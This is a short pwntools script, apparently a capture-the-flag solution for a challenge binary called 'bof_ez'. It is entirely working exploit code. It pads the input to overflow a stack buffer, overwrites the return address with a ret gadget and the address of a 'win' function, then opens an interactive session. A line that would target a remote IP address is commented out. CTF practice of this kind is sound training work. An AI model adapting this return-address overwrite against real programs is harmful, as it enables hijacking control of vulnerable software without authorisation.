from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('bof_ez')
r= e.process()
# r = remote('128.199.247.205', 1331)
ret =0x000000000040101a
win=0x401282
payload = b"a"*92+b"a"*4+ b"b"*8+p64(ret)+p64(win)
pause()
r.sendlineafter(b"~~~Give me a number you like: ", payload)

r.interactive()
